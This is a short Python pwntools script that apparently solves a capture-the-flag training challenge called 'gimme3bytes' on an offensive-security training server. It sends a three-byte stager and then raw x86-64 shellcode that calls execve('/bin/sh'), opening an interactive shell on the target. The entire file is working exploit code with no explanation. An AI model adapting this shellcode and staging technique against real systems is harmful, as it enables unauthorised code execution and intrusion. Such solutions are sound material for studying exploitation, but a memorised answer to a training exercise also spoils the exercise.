from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gimme3bytes")
    gdb.attach(r, """
            b *0x004011f1
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2004)

r.send(b"\x5A\x0F\x05")

input("wait")

r.send(b"\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x19\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00")

r.interactive()
